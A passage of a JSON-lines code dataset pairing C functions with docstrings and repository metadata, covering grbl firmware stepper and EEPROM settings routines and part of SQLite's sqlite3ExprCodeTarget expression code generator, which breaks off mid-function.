{"docstring": "// Reset and clear stepper subsystem variables\n", "func_signal": "void st_reset()", "code": "{\n  // Initialize stepper driver idle state.\n  st_go_idle();\n  \n  // Initialize stepper algorithm variables.\n  memset(&prep, 0, sizeof(st_prep_t));\n  memset(&st, 0, sizeof(stepper_t));\n  st.exec_segment = NULL;\n  pl_block = NULL;  // Planner block pointer used by segment buffer\n  segment_buffer_tail = 0;\n  segment_buffer_head = 0; // empty = tail\n  segment_next_head = 1;\n  busy = false;\n  \n  st_generate_step_dir_invert_masks();\n      \n  // Initialize step and direction port pins.\n  STEP_PORT = (STEP_PORT & ~STEP_MASK) | step_port_invert_mask;\n  DIRECTION_PORT = (DIRECTION_PORT & ~DIRECTION_MASK) | dir_port_invert_mask;\n}", "path": "grbl/grbl/stepper.c", "commit_date": "2016-03-04 00:00:00", "repo_name": "grbl/grbl", "stars": 5327, "license": "other", "language": "c", "size": 2285}
{"docstring": "// Stepper state initialization. Cycle should only start if the st.cycle_start flag is\n// enabled. Startup init and limits call this function but shouldn't start the cycle.\n", "func_signal": "void st_wake_up()", "code": "{\n  // Enable stepper drivers.\n  if (bit_istrue(settings.flags,BITFLAG_INVERT_ST_ENABLE)) { STEPPERS_DISABLE_PORT |= (1<<STEPPERS_DISABLE_BIT); }\n  else { STEPPERS_DISABLE_PORT &= ~(1<<STEPPERS_DISABLE_BIT); }\n\n  if (sys.state & (STATE_CYCLE | STATE_HOMING)){\n    // Initialize stepper output bits\n    st.dir_outbits = dir_port_invert_mask; \n    st.step_outbits = step_port_invert_mask;\n    \n    // Initialize step pulse timing from settings. Here to ensure updating after re-writing.\n    #ifdef STEP_PULSE_DELAY\n      // Set total step pulse time after direction pin set. Ad hoc computation from oscilloscope.\n      st.step_pulse_time = -(((settings.pulse_microseconds+STEP_PULSE_DELAY-2)*TICKS_PER_MICROSECOND) >> 3);\n      // Set delay between direction pin write and step command.\n      OCR0A = -(((settings.pulse_microseconds)*TICKS_PER_MICROSECOND) >> 3);\n    #else // Normal operation\n      // Set step pulse time. Ad hoc computation from oscilloscope. Uses two's complement.\n      st.step_pulse_time = -(((settings.pulse_microseconds-2)*TICKS_PER_MICROSECOND) >> 3);\n    #endif\n\n    // Enable Stepper Driver Interrupt\n    TIMSK1 |= (1<<OCIE1A);\n  }\n}", "path": "grbl/grbl/stepper.c", "commit_date": "2016-03-04 00:00:00", "repo_name": "grbl/grbl", "stars": 5327, "license": "other", "language": "c", "size": 2285}
{"docstring": "// Print a string stored in PGM-memory\n", "func_signal": "void printPgmString(const char *s)", "code": "{\n  char c;\n  while ((c = pgm_read_byte_near(s++)))\n    serial_write(c);\n}", "path": "grbl/grbl/print.c", "commit_date": "2015-05-23 00:00:00", "repo_name": "grbl/grbl", "stars": 5327, "license": "other", "language": "c", "size": 2285}
{"docstring": "/* The Stepper Port Reset Interrupt: Timer0 OVF interrupt handles the falling edge of the step\n   pulse. This should always trigger before the next Timer1 COMPA interrupt and independently\n   finish, if Timer1 is disabled after completing a move.\n   NOTE: Interrupt collisions between the serial and stepper interrupts can cause delays by\n   a few microseconds, if they execute right before one another. Not a big deal, but can\n   cause issues at high step rates if another high frequency asynchronous interrupt is \n   added to Grbl.\n*/\n// This interrupt is enabled by ISR_TIMER1_COMPAREA when it sets the motor port bits to execute\n// a step. This ISR resets the motor port after a short period (settings.pulse_microseconds) \n// completing one step cycle.\n", "func_signal": "ISR(TIMER0_OVF_vect)", "code": "{\n  // Reset stepping pins (leave the direction pins)\n  STEP_PORT = (STEP_PORT & ~STEP_MASK) | (step_port_invert_mask & STEP_MASK); \n  TCCR0B = 0; // Disable Timer0 to prevent re-entering this interrupt when it's not needed. \n}", "path": "grbl/grbl/stepper.c", "commit_date": "2016-03-04 00:00:00", "repo_name": "grbl/grbl", "stars": 5327, "license": "other", "language": "c", "size": 2285}
{"docstring": "// Method to store startup lines into EEPROM\n", "func_signal": "void settings_store_startup_line(uint8_t n, char *line)", "code": "{\n  uint32_t addr = n*(LINE_BUFFER_SIZE+1)+EEPROM_ADDR_STARTUP_BLOCK;\n  memcpy_to_eeprom_with_checksum(addr,(char*)line, LINE_BUFFER_SIZE);\n}", "path": "grbl/grbl/settings.c", "commit_date": "2015-06-25 00:00:00", "repo_name": "grbl/grbl", "stars": 5327, "license": "other", "language": "c", "size": 2285}
{"docstring": "// Reads Grbl global settings struct from EEPROM.\n", "func_signal": "uint8_t read_global_settings()", "code": "{\n  // Check version-byte of eeprom\n  uint8_t version = eeprom_get_char(0);\n  if (version == SETTINGS_VERSION) {\n    // Read settings-record and check checksum\n    if (!(memcpy_from_eeprom_with_checksum((char*)&settings, EEPROM_ADDR_GLOBAL, sizeof(settings_t)))) {\n      return(false);\n    }\n  } else {\n    return(false); \n  }\n  return(true);\n}", "path": "grbl/grbl/settings.c", "commit_date": "2015-06-25 00:00:00", "repo_name": "grbl/grbl", "stars": 5327, "license": "other", "language": "c", "size": 2285}
{"docstring": "// Initialize the config subsystem\n", "func_signal": "void settings_init()", "code": "{\n  if(!read_global_settings()) {\n    report_status_message(STATUS_SETTING_READ_FAIL);\n    settings_restore(SETTINGS_RESTORE_ALL); // Force restore all EEPROM data.\n    report_grbl_settings();\n  }\n\n  // NOTE: Checking paramater data, startup lines, and build info string should be done here, \n  // but it seems fairly redundant. Each of these can be manually checked and reset or restored.\n  // Check all parameter data into a dummy variable. If error, reset to zero, otherwise do nothing.\n  // float coord_data[N_AXIS];\n  // uint8_t i;\n  // for (i=0; i<=SETTING_INDEX_NCOORD; i++) {\n  //   if (!settings_read_coord_data(i, coord_data)) {\n  // \treport_status_message(STATUS_SETTING_READ_FAIL);\n  //   }\n  // }\n  // NOTE: Startup lines are checked and executed by protocol_main_loop at the end of initialization.\n}", "path": "grbl/grbl/settings.c", "commit_date": "2015-06-25 00:00:00", "repo_name": "grbl/grbl", "stars": 5327, "license": "other", "language": "c", "size": 2285}
{"docstring": "/*\n** Generate code into the current Vdbe to evaluate the given\n** expression.  Attempt to store the results in register \"target\".\n** Return the register where results are stored.\n**\n** With this routine, there is no guarantee that results will\n** be stored in target.  The result might be stored in some other\n** register if it is convenient to do so.  The calling function\n** must check the return code and move the results to the desired\n** register.\n*/\n", "func_signal": "SQLITE_PRIVATE int sqlite3ExprCodeTarget(Parse *pParse, Expr *pExpr, int target)", "code": "{\n  Vdbe *v = pParse->pVdbe;  /* The VM under construction */\n  int op;                   /* The opcode being coded */\n  int inReg = target;       /* Results stored in register inReg */\n  int regFree1 = 0;         /* If non-zero free this temporary register */\n  int regFree2 = 0;         /* If non-zero free this temporary register */\n  int r1, r2;               /* Various register numbers */\n  Expr tempX;               /* Temporary expression node */\n  int p5 = 0;\n\n  assert( target>0 && target<=pParse->nMem );\n  assert( v!=0 );\n\nexpr_code_doover:\n  if( pExpr==0 ){\n    op = TK_NULL;\n  }else{\n    assert( !ExprHasVVAProperty(pExpr,EP_Immutable) );\n    op = pExpr->op;\n  }\n  switch( op ){\n    case TK_AGG_COLUMN: {\n      AggInfo *pAggInfo = pExpr->pAggInfo;\n      struct AggInfo_col *pCol;\n      assert( pAggInfo!=0 );\n      assert( pExpr->iAgg>=0 && pExpr->iAgg<pAggInfo->nColumn );\n      pCol = &pAggInfo->aCol[pExpr->iAgg];\n      if( !pAggInfo->directMode ){\n        assert( pCol->iMem>0 );\n        return pCol->iMem;\n      }else if( pAggInfo->useSortingIdx ){\n        Table *pTab = pCol->pTab;\n        sqlite3VdbeAddOp3(v, OP_Column, pAggInfo->sortingIdxPTab,\n                              pCol->iSorterColumn, target);\n        if( pCol->iColumn<0 ){\n          VdbeComment((v,\"%s.rowid\",pTab->zName));\n        }else{\n          VdbeComment((v,\"%s.%s\",pTab->zName,pTab->aCol[pCol->iColumn].zName));\n          if( pTab->aCol[pCol->iColumn].affinity==SQLITE_AFF_REAL ){\n            sqlite3VdbeAddOp1(v, OP_RealAffinity, target);\n          }\n        }\n        return target;\n      }\n      /* Otherwise, fall thru into the TK_COLUMN case */\n      /* no break */ deliberate_fall_through\n    }\n    case TK_COLUMN: {\n      int iTab = pExpr->iTable;\n      int iReg;\n      if( ExprHasProperty(pExpr, EP_FixedCol) ){\n        /* This COLUMN expression is really a constant due to WHERE clause\n        ** constraints, and that constant is coded by the pExpr->pLeft\n        ** expresssion.  However, make sure the constant has the correct\n        ** datatype by applying the Affinity of the table column to the\n        ** constant.\n        */\n        int aff;\n        iReg = sqlite3ExprCodeTarget(pParse, pExpr->pLeft,target);\n        if( pExpr->y.pTab ){\n          aff = sqlite3TableColumnAffinity(pExpr->y.pTab, pExpr->iColumn);\n        }else{\n          aff = pExpr->affExpr;\n        }\n        if( aff>SQLITE_AFF_BLOB ){\n          static const char zAff[] = \"B\\000C\\000D\\000E\";\n          assert( SQLITE_AFF_BLOB=='A' );\n          assert( SQLITE_AFF_TEXT=='B' );\n          sqlite3VdbeAddOp4(v, OP_Affinity, iReg, 1, 0,\n                            &zAff[(aff-'B')*2], P4_STATIC);\n        }\n        return iReg;\n      }\n      if( iTab<0 ){\n        if( pParse->iSelfTab<0 ){\n          /* Other columns in the same row for CHECK constraints or\n          ** generated columns or for inserting into partial index.\n          ** The row is unpacked into registers beginning at\n          ** 0-(pParse->iSelfTab).  The rowid (if any) is in a register\n          ** immediately prior to the first column.\n          */\n          Column *pCol;\n          Table *pTab = pExpr->y.pTab;\n          int iSrc;\n          int iCol = pExpr->iColumn;\n          assert( pTab!=0 );\n          assert( iCol>=XN_ROWID );\n          assert( iCol<pTab->nCol );\n          if( iCol<0 ){\n            return -1-pParse->iSelfTab;\n          }\n          pCol = pTab->aCol + iCol;\n          testcase( iCol!=sqlite3TableColumnToStorage(pTab,iCol) );\n          iSrc = sqlite3TableColumnToStorage(pTab, iCol) - pParse->iSelfTab;\n#ifndef SQLITE_OMIT_GENERATED_COLUMNS\n          if( pCol->colFlags & COLFLAG_GENERATED ){\n            if( pCol->colFlags & COLFLAG_BUSY ){\n              sqlite3ErrorMsg(pParse, \"generated column loop on \\\"%s\\\"\",\n                              pCol->zName);\n              return 0;\n            }\n            pCol->colFlags |= COLFLAG_BUSY;\n            if( pCol->colFlags & COLFLAG_NOTAVAIL ){\n              sqlite3ExprCodeGeneratedColumn(pParse, pCol, iSrc);\n            }\n            pCol->colFlags &= ~(COLFLAG_BUSY|COLFLAG_NOTAVAIL);\n            return iSrc;\n          }else\n#endif /* SQLITE_OMIT_GENERATED_COLUMNS */\n          if( pCol->affinity==SQLITE_AFF_REAL ){\n            sqlite3VdbeAddOp2(v, OP_SCopy, iSrc, target);\n            sqlite3VdbeAddOp1(v, OP_RealAffinity, target);\n            return target;\n          }else{\n            return iSrc;\n          }\n        }else{\n          /* Coding an expression that is part of an index where column names\n          ** in the index refer to the table to which the index belongs */\n          iTab = pParse->iSelfTab - 1;\n        }\n      }\n      iReg = sqlite3ExprCodeGetColumn(pParse, pExpr->y.pTab,\n                               pExpr->iColumn, iTab, target,\n                               pExpr->op2);\n      if( pExpr->y.pTab==0 && pExpr->affExpr==SQLITE_AFF_REAL ){\n        sqlite3VdbeAddOp1(v, OP_RealAffinity, iReg);\n      }\n      return iReg;\n    }\n    case TK_INTEGER: {\n      codeInteger(pParse, pExpr, 0, target);\n      return target;\n    }\n    case TK_TRUEFALSE: {\n      sqlite3VdbeAddOp2(v, OP_Integer, sqlite3ExprTruthValue(pExpr), target);\n      return target;\n    }\n#ifndef SQLITE_OMIT_FLOATING_POINT\n    case TK_FLOAT: {\n      assert( !ExprHasProperty(pExpr, EP_IntValue) );\n      codeReal(v, pExpr->u.zToken, 0, target);\n      return target;\n    }\n#endif\n    case TK_STRING: {\n      assert( !ExprHasProperty(pExpr, EP_IntValue) );\n      sqlite3VdbeLoadString(v, target, pExpr->u.zToken);\n      return target;\n    }\n    default: {\n      /* Make NULL the default case so that if a bug causes an illegal\n      ** Expr node to be passed into this function, it will be handled\n      ** sanely and not crash.  But keep the assert() to bring the problem\n      ** to the attention of the developers. */\n      assert( op==TK_NULL );\n      sqlite3VdbeAddOp2(v, OP_Null, 0, target);\n      return target;\n    }\n#ifndef SQLITE_OMIT_BLOB_LITERAL\n    case TK_BLOB: {\n      int n;\n      const char *z;\n      char *zBlob;\n      assert( !ExprHasProperty(pExpr, EP_IntValue) );\n      assert( pExpr->u.zToken[0]=='x' || pExpr->u.zToken[0]=='X' );\n      assert( pExpr->u.zToken[1]=='\\'' );\n      z = &pExpr->u.zToken[2];\n      n = sqlite3Strlen30(z) - 1;\n      assert( z[n]=='\\'' );\n      zBlob = sqlite3HexToBlob(sqlite3VdbeDb(v), z, n);\n      sqlite3VdbeAddOp4(v, OP_Blob, n/2, target, 0, zBlob, P4_DYNAMIC);\n      return target;\n    }\n#endif\n    case TK_VARIABLE: {\n      assert( !ExprHasProperty(pExpr, EP_IntValue) );\n      assert( pExpr->u.zToken!=0 );\n      assert( pExpr->u.zToken[0]!=0 );\n      sqlite3VdbeAddOp2(v, OP_Variable, pExpr->iColumn, target);\n      if( pExpr->u.zToken[1]!=0 ){\n        const char *z = sqlite3VListNumToName(pParse->pVList, pExpr->iColumn);\n        assert( pExpr->u.zToken[0]=='?' || (z && !strcmp(pExpr->u.zToken, z)) );\n        pParse->pVList[0] = 0; /* Indicate VList may no longer be enlarged */\n        sqlite3VdbeAppendP4(v, (char*)z, P4_STATIC);\n      }\n      return target;\n    }\n    case TK_REGISTER: {\n      return pExpr->iTable;\n    }\n#ifndef SQLITE_OMIT_CAST\n    case TK_CAST: {\n      /* Expressions of the form:   CAST(pLeft AS token) */\n      inReg = sqlite3ExprCodeTarget(pParse, pExpr->pLeft, target);\n      if( inReg!=target ){\n        sqlite3VdbeAddOp2(v, OP_SCopy, inReg, target);\n        inReg = target;\n      }\n      sqlite3VdbeAddOp2(v, OP_Cast, target,\n                        sqlite3AffinityType(pExpr->u.zToken, 0));\n      return inReg;\n    }\n#endif /* SQLITE_OMIT_CAST */\n    case TK_IS:\n    case TK_ISNOT:\n      op = (op==TK_IS) ? TK_EQ : TK_NE;\n      p5 = SQLITE_NULLEQ;\n      /* fall-through */\n    case TK_LT:\n    case TK_LE:\n    case TK_GT:\n    case TK_GE:\n    case TK_NE:\n    case TK_EQ: {\n      Expr *pLeft = pExpr->pLeft;\n      if( sqlite3ExprIsVector(pLeft) ){\n        codeVectorCompare(pParse, pExpr, target, op, p5);\n      }else{\n        r1 = sqlite3ExprCodeTemp(pParse, pLeft, &regFree1);\n        r2 = sqlite3ExprCodeTemp(pParse, pExpr->pRight, &regFree2);\n        codeCompare(pParse, pLeft, pExpr->pRight, op,\n            r1, r2, inReg, SQLITE_STOREP2 | p5,\n            ExprHasProperty(pExpr,EP_Commuted));\n        assert(TK_LT==OP_Lt); testcase(op==OP_Lt); VdbeCoverageIf(v,op==OP_Lt);\n        assert(TK_LE==OP_Le); testcase(op==OP_Le); VdbeCoverageIf(v,op==OP_Le);\n        assert(TK_GT==OP_Gt); testcase(op==OP_Gt); VdbeCoverageIf(v,op==OP_Gt);\n        assert(TK_GE==OP_Ge); testcase(op==OP_Ge); VdbeCoverageIf(v,op==OP_Ge);\n        assert(TK_EQ==OP_Eq); testcase(op==OP_Eq); VdbeCoverageIf(v,op==OP_Eq);\n        assert(TK_NE==OP_Ne); testcase(op==OP_Ne); VdbeCoverageIf(v,op==OP_Ne);\n        testcase( regFree1==0 );\n        testcase( regFree2==0 );\n      }\n      break;\n    }\n    case TK_AND:\n    case TK_OR:\n    case TK_PLUS:\n    case TK_STAR:\n    case TK_MINUS:\n    case TK_REM:\n    case TK_BITAND:\n    case TK_BITOR:\n    case TK_SLASH:\n    case TK_LSHIFT:\n    case TK_RSHIFT:\n    case TK_CONCAT: {\n      assert( TK_AND==OP_And );            testcase( op==TK_AND );\n      assert( TK_OR==OP_Or );              testcase( op==TK_OR );\n      assert( TK_PLUS==OP_Add );           testcase( op==TK_PLUS );\n      assert( TK_MINUS==OP_Subtract );     testcase( op==TK_MINUS );\n      assert( TK_REM==OP_Remainder );      testcase( op==TK_REM );\n      assert( TK_BITAND==OP_BitAnd );      testcase( op==TK_BITAND );\n      assert( TK_BITOR==OP_BitOr );        testcase( op==TK_BITOR );\n      assert( TK_SLASH==OP_Divide );       testcase( op==TK_SLASH );\n      assert( TK_LSHIFT==OP_ShiftLeft );   testcase( op==TK_LSHIFT );\n      assert( TK_RSHIFT==OP_ShiftRight );  testcase( op==TK_RSHIFT );\n      assert( TK_CONCAT==OP_Concat );      testcase( op==TK_CONCAT );\n      r1 = sqlite3ExprCodeTemp(pParse, pExpr->pLeft, &regFree1);\n      r2 = sqlite3ExprCodeTemp(pParse, pExpr->pRight, &regFree2);\n      sqlite3VdbeAddOp3(v, op, r2, r1, target);\n      testcase( regFree1==0 );\n      testcase( regFree2==0 );\n      break;\n    }\n    case TK_UMINUS: {\n      Expr *pLeft = pExpr->pLeft;\n      assert( pLeft );\n      if( pLeft->op==TK_INTEGER ){\n        codeInteger(pParse, pLeft, 1, target);\n        return target;\n#ifndef SQLITE_OMIT_FLOATING_POINT\n      }else if( pLeft->op==TK_FLOAT ){\n        assert( !ExprHasProperty(pExpr, EP_IntValue) );\n        codeReal(v, pLeft->u.zToken, 1, target);\n        return target;\n#endif\n      }else{\n        tempX.op = TK_INTEGER;\n        tempX.flags = EP_IntValue|EP_TokenOnly;\n        tempX.u.iValue = 0;\n        ExprClearVVAProperties(&tempX);\n        r1 = sqlite3ExprCodeTemp(pParse, &tempX, &regFree1);\n        r2 = sqlite3ExprCodeTemp(pParse, pExpr->pLeft, &regFree2);\n        sqlite3VdbeAddOp3(v, OP_Subtract, r2, r1, target);\n        testcase( regFree2==0 );\n      }\n      break;\n    }\n    case TK_BITNOT:\n    case TK_NOT: {\n      assert( TK_BITNOT==OP_BitNot );   testcase( op==TK_BITNOT );\n      assert( TK_NOT==OP_Not );         testcase( op==TK_NOT );\n      r1 = sqlite3ExprCodeTemp(pParse, pExpr->pLeft, &regFree1);\n      testcase( regFree1==0 );\n      sqlite3VdbeAddOp2(v, op, r1, inReg);\n      break;\n    }\n    case TK_TRUTH: {\n      int isTrue;    /* IS TRUE or IS NOT TRUE */\n      int bNormal;   /* IS TRUE or IS FALSE */\n      r1 = sqlite3ExprCodeTemp(pParse, pExpr->pLeft, &regFree1);\n      testcase( regFree1==0 );\n      isTrue = sqlite3ExprTruthValue(pExpr->pRight);\n      bNormal = pExpr->op2==TK_IS;\n      testcase( isTrue && bNormal);\n      testcase( !isTrue && bNormal);\n      sqlite3VdbeAddOp4Int(v, OP_IsTrue, r1, inReg, !isTrue, isTrue ^ bNormal);\n      break;\n    }\n    case TK_ISNULL:\n    case TK_NOTNULL: {\n      int addr;\n      assert( TK_ISNULL==OP_IsNull );   testcase( op==TK_ISNULL );\n      assert( TK_NOTNULL==OP_NotNull ); testcase( op==TK_NOTNULL );\n      sqlite3VdbeAddOp2(v, OP_Integer, 1, target);\n      r1 = sqlite3ExprCodeTemp(pParse, pExpr->pLeft, &regFree1);\n      testcase( regFree1==0 );\n      addr = sqlite3VdbeAddOp1(v, op, r1);\n      VdbeCoverageIf(v, op==TK_ISNULL);\n      VdbeCoverageIf(v, op==TK_NOTNULL);\n      sqlite3VdbeAddOp2(v, OP_Integer, 0, target);\n      sqlite3VdbeJumpHere(v, addr);\n      break;\n    }\n    case TK_AGG_FUNCTION: {\n      AggInfo *pInfo = pExpr->pAggInfo;\n      if( pInfo==0\n       || NEVER(pExpr->iAgg<0)\n       || NEVER(pExpr->iAgg>=pInfo->nFunc)\n      ){\n        assert( !ExprHasProperty(pExpr, EP_IntValue) );\n        sqlite3ErrorMsg(pParse, \"misuse of aggregate: %s()\", pExpr->u.zToken);\n      }else{\n        return pInfo->aFunc[pExpr->iAgg].iMem;\n      }\n      break;\n    }\n    case TK_FUNCTION: {\n      ExprList *pFarg;       /* List of function arguments */\n      int nFarg;             /* Number of function arguments */\n      FuncDef *pDef;         /* The function definition object */\n      const char *zId;       /* The function name */\n      u32 constMask = 0;     /* Mask of function arguments that are constant */\n      int i;                 /* Loop counter */\n      sqlite3 *db = pParse->db;  /* The database connection */\n      u8 enc = ENC(db);      /* The text encoding used by this database */\n      CollSeq *pColl = 0;    /* A collating sequence */\n\n#ifndef SQLITE_OMIT_WINDOWFUNC\n      if( ExprHasProperty(pExpr, EP_WinFunc) ){\n        return pExpr->y.pWin->regResult;\n      }\n#endif\n\n      if( ConstFactorOk(pParse) && sqlite3ExprIsConstantNotJoin(pExpr) ){\n        /* SQL functions can be expensive. So try to avoid running them\n        ** multiple times if we know they always give the same result */\n        return sqlite3ExprCodeRunJustOnce(pParse, pExpr, -1);\n      }\n      assert( !ExprHasProperty(pExpr, EP_xIsSelect) );\n      assert( !ExprHasProperty(pExpr, EP_TokenOnly) );\n      pFarg = pExpr->x.pList;\n      nFarg = pFarg ? pFarg->nExpr : 0;\n      assert( !ExprHasProperty(pExpr, EP_IntValue) );\n      zId = pExpr->u.zToken;\n      pDef = sqlite3FindFunction(db, zId, nFarg, enc, 0);\n#ifdef SQLITE_ENABLE_UNKNOWN_SQL_FUNCTION\n      if( pDef==0 && pParse->explain ){\n        pDef = sqlite3FindFunction(db, \"unknown\", nFarg, enc, 0);\n      }\n#endif\n      if( pDef==0 || pDef->xFinalize!=0 ){\n        sqlite3ErrorMsg(pParse, \"unknown function: %s()\", zId);\n        break;\n      }\n      if( pDef->funcFlags & SQLITE_FUNC_INLINE ){\n        assert( (pDef->funcFlags & SQLITE_FUNC_UNSAFE)==0 );\n        assert( (pDef->funcFlags & SQLITE_FUNC_DIRECT)==0 );\n        return exprCodeInlineFunction(pParse, pFarg,\n             SQLITE_PTR_TO_INT(pDef->pUserData), target);\n      }else if( pDef->funcFlags & (SQLITE_FUNC_DIRECT|SQLITE_FUNC_UNSAFE) ){\n        sqlite3ExprFunctionUsable(pParse, pExpr, pDef);\n      }\n\n      for(i=0; i<nFarg; i++){\n        if( i<32 && sqlite3ExprIsConstant(pFarg->a[i].pExpr) ){\n          testcase( i==31 );\n          constMask |= MASKBIT32(i);\n        }\n        if( (pDef->funcFlags & SQLITE_FUNC_NEEDCOLL)!=0 && !pColl ){\n          pColl = sqlite3ExprCollSeq(pParse, pFarg->a[i].pExpr);\n        }\n      }\n      if( pFarg ){\n        if( constMask ){\n          r1 = pParse->nMem+1;\n          pParse->nMem += nFarg;\n        }else{\n          r1 = sqlite3GetTempRange(pParse, nFarg);\n        }\n\n        /* For length() and typeof() functions with a column argument,\n        ** set the P5 parameter to the OP_Column opcode to OPFLAG_LENGTHARG\n        ** or OPFLAG_TYPEOFARG respectively, to avoid unnecessary data\n        ** loading.\n        */\n        if( (pDef->funcFlags & (SQLITE_FUNC_LENGTH|SQLITE_FUNC_TYPEOF))!=0 ){\n          u8 exprOp;\n          assert( nFarg==1 );\n          assert( pFarg->a[0].pExpr!=0 );\n          exprOp = pFarg->a[0].pExpr->op;\n          if( exprOp==TK_COLUMN || exprOp==TK_AGG_COLUMN ){\n            assert( SQLITE_FUNC_LENGTH==OPFLAG_LENGTHARG );\n            assert( SQLITE_FUNC_TYPEOF==OPFLAG_TYPEOFARG );\n            testcase( pDef->funcFlags & OPFLAG_LENGTHARG );\n            pFarg->a[0].pExpr->op2 =\n                  pDef->funcFlags & (OPFLAG_LENGTHARG|OPFLAG_TYPEOFARG);\n          }\n        }\n\n        sqlite3ExprCodeExprList(pParse, pFarg, r1, 0,\n                                SQLITE_ECEL_DUP|SQLITE_ECEL_FACTOR);\n      }else{\n        r1 = 0;\n      }\n#ifndef SQLITE_OMIT_VIRTUALTABLE\n      /* Possibly overload the function if the first argument is\n      ** a virtual table column.\n      **\n      ** For infix functions (LIKE, GLOB, REGEXP, and MATCH) use the\n      ** second argument, not the first, as the argument to test to\n      ** see if it is a column in a virtual table.  This is done because\n      ** the left operand of infix functions (the operand we want to\n      ** control overloading) ends up as the second argument to the\n      ** function.  The expression \"A glob B\" is equivalent to\n      ** \"glob(B,A).  We want to use the A in \"A glob B\" to test\n      ** for function overloading.  But we use the B term in \"glob(B,A)\".\n      */\n      if( nFarg>=2 && ExprHasProperty(pExpr, EP_InfixFunc) ){\n        pDef = sqlite3VtabOverloadFunction(db, pDef, nFarg, pFarg->a[1].pExpr);\n      }else if( nFarg>0 ){\n        pDef = sqlite3VtabOverloadFunction(db, pDef, nFarg, pFarg->a[0].pExpr);\n      }\n#endif\n      if( pDef->funcFlags & SQLITE_FUNC_NEEDCOLL ){\n        if( !pColl ) pColl = db->pDfltColl;\n        sqlite3VdbeAddOp4(v, OP_CollSeq, 0, 0, 0, (char *)pColl, P4_COLLSEQ);\n      }\n#ifdef SQLITE_ENABLE_OFFSET_SQL_FUNC\n      if( pDef->funcFlags & SQLITE_FUNC_OFFSET ){\n        Expr *pArg = pFarg->a[0].pExpr;\n        if( pArg->op==TK_COLUMN ){\n          sqlite3VdbeAddOp3(v, OP_Offset, pArg->iTable, pArg->iColumn, target);\n        }else{\n          sqlite3VdbeAddOp2(v, OP_Null, 0, target);\n        }\n      }else\n#endif\n      {\n        sqlite3VdbeAddFunctionCall(pParse, constMask, r1, target, nFarg,\n                                   pDef, pExpr->op2);\n      }\n      if( nFarg ){\n        if( constMask==0 ){\n          sqlite3ReleaseTempRange(pParse, r1, nFarg);\n        }else{\n          sqlite3VdbeReleaseRegisters(pParse, r1, nFarg, constMask, 1);\n        }\n      }\n      return target;\n    }\n#ifndef SQLITE_OMIT_SUBQUERY\n    case TK_EXISTS:\n    case TK_SELECT: {\n      int nCol;\n      testcase( op==TK_EXISTS );\n      testcase( op==TK_SELECT );\n      if( pParse->db->mallocFailed ){\n        return 0;\n      }else if( op==TK_SELECT && (nCol = pExpr->x.pSelect->pEList->nExpr)!=1 ){\n        sqlite3SubselectError(pParse, nCol, 1);\n      }else{\n        return sqlite3CodeSubselect(pParse, pExpr);\n      }\n      break;\n    }\n    case TK_SELECT_COLUMN: {\n      int n;\n      if( pExpr->pLeft->iTable==0 ){\n        pExpr->pLeft->iTable = sqlite3CodeSubselect(pParse, pExpr->pLeft);\n      }\n      assert( pExpr->iTable==0 || pExpr->pLeft->op==TK_SELECT );\n      if( pExpr->iTable!=0\n       && pExpr->iTable!=(n = sqlite3ExprVectorSize(pExpr->pLeft))\n      ){\n        sqlite3ErrorMsg(pParse, \"%d columns assigned %d values\",\n                                pExpr->iTable, n);\n      }\n      return pExpr->pLeft->iTable + pExpr->iColumn;\n    }\n    case TK_IN: {\n      int destIfFalse = sqlite3VdbeMakeLabel(pParse);\n      int destIfNull = sqlite3VdbeMakeLabel(pParse);\n      sqlite3VdbeAddOp2(v, OP_Null, 0, target);\n      sqlite3ExprCodeIN(pParse, pExpr, destIfFalse, destIfNull);\n      sqlite3VdbeAddOp2(v, OP_Integer, 1, target);\n      sqlite3VdbeResolveLabel(v, destIfFalse);\n      sqlite3VdbeAddOp2(v, OP_AddImm, target, 0);\n      sqlite3VdbeResolveLabel(v, destIfNull);\n      return target;\n    }\n#endif /* SQLITE_OMIT_SUBQUERY */\n\n\n    /*\n    **    x BETWEEN y AND z\n    **\n    ** This is equivalent to\n    **\n    **    x>=y AND x<=z\n    **\n    ** X is stored in pExpr->pLeft.\n    ** Y is stored in pExpr->pList->a[0].pExpr.\n    ** Z is stored in pExpr->pList->a[1].pExpr.\n    */\n    case TK_BETWEEN: {\n      exprCodeBetween(pParse, pExpr, target, 0, 0);\n      return target;\n    }\n    case TK_SPAN:\n    case TK_COLLATE:\n    case TK_UPLUS: {\n      pExpr = pExpr->pLeft;\n      goto expr_code_doover; /* 2018-04-28: Prevent deep recursion. OSSFuzz. */\n    }\n\n    case TK_TRIGGER: {\n      /* If the opcode is TK_TRIGGER, then the expression is a reference\n      ** to a column in the new.* or old.* pseudo-tables available to\n      ** trigger programs. In this case Expr.iTable is set to 1 for the\n      ** new.* pseudo-table, or 0 for the old.* pseudo-table. Expr.iColumn\n      ** is set to the column of the pseudo-table to read, or to -1 to\n      ** read the rowid field.\n      **\n      ** The expression is implemented using an OP_Param opcode. The p1\n      ** parameter is set to 0 for an old.rowid reference, or to (i+1)\n      ** to reference another column of the old.* pseudo-table, where\n      ** i is the index of the column. For a new.rowid reference, p1 is\n      ** set to (n+1), where n is the number of columns in each pseudo-table.\n      ** For a reference to any other column in the new.* pseudo-table, p1\n      ** is set to (n+2+i), where n and i are as defined previously. For\n      ** example, if the table on which triggers are being fired is\n      ** declared as:\n      **\n      **   CREATE TABLE t1(a, b);\n      **\n      ** Then p1 is interpreted as follows:\n      **\n      **   p1==0   ->    old.rowid     p1==3   ->    new.rowid\n      **   p1==1   ->    old.a         p1==4   ->    new.a\n      **   p1==2   ->    old.b         p1==5   ->    new.b\n      */\n      Table *pTab = pExpr->y.pTab;\n      int iCol = pExpr->iColumn;\n      int p1 = pExpr->iTable * (pTab->nCol+1) + 1\n                     + sqlite3TableColumnToStorage(pTab, iCol);\n\n      assert( pExpr->iTable==0 || pExpr->iTable==1 );\n      assert( iCol>=-1 && iCol<pTab->nCol );\n      assert( pTab->iPKey<0 || iCol!=pTab->iPKey );\n      assert( p1>=0 && p1<(pTab->nCol*2+2) );\n\n      sqlite3VdbeAddOp2(v, OP_Param, p1, target);\n      VdbeComment((v, \"r[%d]=%s.%s\", target,\n        (pExpr->iTable ? \"new\" : \"old\"),\n        (pExpr->iColumn<0 ? \"rowid\" : pExpr->y.pTab->aCol[iCol].zName)\n      ));\n\n#ifndef SQLITE_OMIT_FLOATING_POINT\n      /* If the column has REAL affinity, it may currently be stored as an\n      ** integer. Use OP_RealAffinity to make sure it is really real.\n      **\n      ** EVIDENCE-OF: R-60985-57662 SQLite will convert the value back to\n      ** floating point when extracting it from the record.  */\n      if( iCol>=0 && 